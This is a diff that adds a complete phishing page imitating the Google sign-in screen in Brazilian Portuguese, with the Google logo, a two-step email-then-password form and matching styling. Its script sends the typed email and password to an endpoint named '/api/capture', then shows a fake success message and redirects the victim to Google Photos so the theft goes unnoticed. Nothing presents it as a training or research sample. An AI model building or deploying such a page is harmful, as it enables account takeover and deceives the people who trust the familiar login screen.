@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fazer login – Conta do Google</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%234285F4' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/><path fill='%2334A853' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/><path fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/><path fill='%23EA4335' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh}
+.topbar{width:100%;padding:12px 24px;display:flex;justify-content:flex-end;gap:20px;font-size:13px;color:#3c4043}
+.topbar a{color:#3c4043;text-decoration:none}
+.card{background:#fff;border-radius:8px;box-shadow:0 1px 2px rgba(60,64,67,.3),0 2px 6px 2px rgba(60,64,67,.15);padding:48px 40px 36px;width:420px;max-width:92vw;margin-top:40px;text-align:center}
+.logo{margin-bottom:28px}
+h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
+.subtitle{font-size:14px;color:#3c4043;margin-bottom:32px}
+.field{text-align:left;margin-bottom:24px}
+.field label{display:block;font-size:12px;color:#3c4043;margin-bottom:8px}
+.field input{width:100%;padding:12px 16px;font-size:16px;border:none;border-bottom:1px solid #dadce0;outline:none;background:#f1f3f4;border-radius:4px 4px 0 0;transition:border .2s}
+.field input:focus{border-bottom:2px solid #1a73e8;background:#fff}
+.btn-row{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
+.btn-link{background:none;border:none;color:#1a73e8;font-size:14px;cursor:pointer;padding:10px 16px;border-radius:4px}
+.btn-link:hover{background:#e8f0fe}
+.btn-primary{background:#1a73e8;color:#fff;border:none;padding:10px 32px;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer}
+.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
+.footer{position:absolute;bottom:0;width:100%;padding:16px 24px;display:flex;justify-content:space-between;font-size:12px;color:#70757a}
+.footer a{color:#70757a;text-decoration:none}
+#msg{margin-top:16px;font-size:14px;color:#188038;display:none}
+.spinner{display:none;margin:20px auto;width:32px;height:32px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <a href="#">Ajuda</a>
+  <a href="#">Barrar</a>
+  <span>Português (Brasil)</span>
+</div>
+<div class="card">
+  <div class="logo">
+    <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+      <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+      <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 9.1 0 11.6-6.71 11.6-13.07v-3.19h-.33c-2.83 3.45-8.48 6.57-15.4 6.57-14.75 0-25.58-11.56-25.58-25.93 0-14.45 10.83-26.01 25.58-26.01 6.92 0 12.57 3.12 15.4 6.57h.33v-4.92h9.59zM163.75 47.18c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#4285F4"/>
+      <path fill="#34A853" d="M225 39.15h9.66c.49-4.02 3.86-6.84 8.86-6.84 5.29 0 8.66 3.45 8.66 8.57v.33c-1.43-.83-3.53-1.34-6.41-1.34-6.24 0-12.95 2.82-12.95 10.16 0 6.57 5.21 9.24 10.21 9.24 4.33 0 7.16-1.99 8.4-4.33l.33.17v3.94h8.32V37.46c0-8.9-5.7-14.45-14.72-14.45-9.24 0-15.4 5.7-16.34 13.52l.98 2.62zm24.83 15.74c-2.68 0-4.78-1.34-4.78-4.02 0-4.33 4.33-5.63 8.4-5.63 2.68 0 4.41.5 5.46 1v-1.16c0-2.07-1.82-3.28-4.41-3.28-2.33 0-4.41 1.16-5.21 2.82l-7.66-2.33c1.51-4.33 6.24-7.66 13.24-7.66 7.82 0 13.07 4.41 13.07 11.56v13.44h-8.32v-3.94l-.33-.17c-1.24 2.33-4.07 4.33-8.4 4.33z"/>
+      <path fill="#EA4335" d="M265.25 26.34h9.74v45.82h-9.74z"/>
+    </svg>
+  </div>
+  <h1>Fazer login</h1>
+  <p class="subtitle">Use sua Conta do Google</p>
+  <div class="field">
+    <label for="email">E-mail ou telefone</label>
+    <input type="text" id="email" autocomplete="username" placeholder=" " autofocus>
+  </div>
+  <div class="field">
+    <label for="password" id="passLabel" style="display:none">Senha</label>
+    <input type="password" id="password" autocomplete="current-password" placeholder=" " style="display:none">
+  </div>
+  <div class="spinner" id="spinner"></div>
+  <p id="msg"></p>
+  <div class="btn-row">
+    <button class="btn-link" onclick="forgot()">Esqueceu a senha?</button>
+    <button class="btn-primary" id="goBtn" onclick="next()">Avançar</button>
+  </div>
+</div>
+<div class="footer">
+  <div>
+    <a href="#">Acerca do Google</a> · <a href="#">Privacidade</a> · <a href="#">Termos</a>
+  </div>
+  <div>
+    <a href="#">Personalizar</a>
+  </div>
+</div>
+<script>
+let step = 1;
+const email = document.getElementById('email');
+const pass = document.getElementById('password');
+const passLabel = document.getElementById('passLabel');
+const goBtn = document.getElementById('goBtn');
+const spinner = document.getElementById('spinner');
+const msg = document.getElementById('msg');
+
+async function next() {
+  if (step === 1) {
+    const e = email.value.trim();
+    if (!e) { email.style.borderBottom = '2px solid #d93025'; return; }
+    step = 2;
+    passLabel.style.display = 'block';
+    pass.style.display = 'block';
+    goBtn.textContent = 'Entrar';
+    pass.focus();
+  } else {
+    const e = email.value.trim();
+    const p = pass.value;
+    if (!p) { pass.style.borderBottom = '2px solid #d93025'; return; }
+    spinner.style.display = 'block';
+    goBtn.disabled = true;
+    try {
+      const res = await fetch('/api/capture', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({email: e, password: p})
+      });
+      const data = await res.json();
+      if (data.ok) {
+        msg.textContent = 'Login bem-sucedido! Redirecionando...';
+        msg.style.display = 'block';
+        setTimeout(() => window.location.href = 'https://photos.google.com', 1200);
+      } else {
+        msg.textContent = data.error || 'Erro. Tente novamente.';
+        msg.style.color = '#d93025';
+        msg.style.display = 'block';
+        spinner.style.display = 'none';
+        goBtn.disabled = false;
+      }
+    } catch(err) {
+      msg.textContent = 'Erro de conexão. Tente novamente.';
+      msg.style.color = '#d93025';
+      msg.style.display = 'block';
+      spinner.style.display = 'none';
+      goBtn.disabled = false;
+    }
+  }
+}
+
+function forgot() {
+  window.location.href = 'https://accounts.google.com/signin/vault/recoveryintro?hl=pt-BR';
+}
+
+email.addEventListener('keydown', e => { if (e.key === 'Enter') next(); });
+pass.addEventListener('keydown', e => { if (e.key === 'Enter') next(); });
+</script>
+</body>
+</html>
